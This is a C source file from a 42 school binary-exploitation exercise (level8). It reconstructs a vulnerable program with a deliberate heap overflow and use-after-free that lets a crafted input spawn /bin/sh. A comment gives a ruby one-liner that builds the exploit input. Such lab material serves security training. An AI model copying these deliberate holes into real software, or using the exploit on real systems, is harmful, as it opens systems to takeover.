/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   level8_2.c                                         :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/04/16 19:26:10 by fcadet            #+#    #+#             */
/*   Updated: 2021/04/18 15:41:20 by fcadet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

//ruby -e 'print "auth \nservice" + "x" * (32 - 16) + "\nlogin\n"' > /tmp/exploit

void	*service;
char	*auth;

int		main(void) {
	char			buffer[128];

	while (42) {
		printf("%p, %p \n", auth, service);
		if (fgets(buffer, 128, stdin)) {
			if (!strncmp(buffer, "auth ", 5)) {
				auth = malloc(4);
				auth[0] = '\0';

				if (strlen(buffer + 5) <= 30)
					strcpy(auth, buffer + 5);
			}
			if (!strncmp(buffer, "reset", 5))
				free(auth);			
			if (!strncmp(buffer, "service", 6))
				service = strdup(buffer + 7);
			if (!strncmp(buffer, "login", 5)) {
				if (auth[32])
					system("/bin/sh");
				else
					fwrite("Password\n", 1, 10, stdout);
			}
		} else {
			break ;
		}
	}
	return (0);
}
